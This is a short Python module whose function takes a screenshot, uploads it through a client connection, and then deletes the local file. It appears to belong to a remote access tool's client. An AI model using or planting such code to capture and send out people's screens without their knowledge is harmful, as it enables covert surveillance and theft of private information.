import pyautogui


def screenshot(protocol):
    try:
        img = pyautogui.screenshot()
        img.save('screen.png')
        from client.modules.file_ops import upload_file
        upload_file(protocol, 'screen.png')
        import os
        os.remove('screen.png')
    except Exception:
        protocol.send('[-] Screenshot failed')
